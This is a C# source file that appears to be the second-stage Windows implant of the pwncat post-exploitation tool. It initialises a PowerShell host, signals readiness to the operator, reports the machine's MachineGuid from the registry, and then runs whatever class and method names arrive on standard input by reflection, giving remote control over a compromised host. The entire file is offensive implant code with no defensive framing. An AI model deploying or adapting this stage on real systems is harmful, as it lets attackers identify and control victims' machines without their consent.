using System;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.Management.Automation.Runspaces;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using Microsoft.Win32;
using System.Web.Script.Serialization;
using System.Collections.Generic;

namespace stagetwo
{
    public class StageTwo
    {

        public static System.String ReadUntilLine(System.String delimeter)
        {
            System.Text.StringBuilder builder = new System.Text.StringBuilder();

            while (true)
            {
                System.String line = System.Console.ReadLine();
                if (line == delimeter)
                {
                    break;
                }
                builder.AppendLine(line);
            }

            return builder.ToString();
        }

        public void main()
        {
            object[] args = new object[] { };

            // Initialize ConsoleHost and PowerShell Runspace
            PowerShell.init_pshost();

            // Tell pwncat we are ready
            System.Console.WriteLine("READY");

            // Send the host identifier
            System.Console.WriteLine((string)Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "NONE"));

            while (true)
            {
                try
                {
                    String type = System.Console.ReadLine();
                    String method_name = System.Console.ReadLine();
                    var method = GetType().Assembly.GetType("stagetwo." + type).GetMethod(method_name);
                    if (method == null) continue;
                    method.Invoke(null, args);
                } catch ( Exception e )
                {
                    System.Console.WriteLine("E:S2:EXCEPTION:" + e.Message);
                    break;
                }
            }
        }




        public static void Main(string[] args)
        {
            var x = new StageTwo();
            x.main();
        }

    }

}
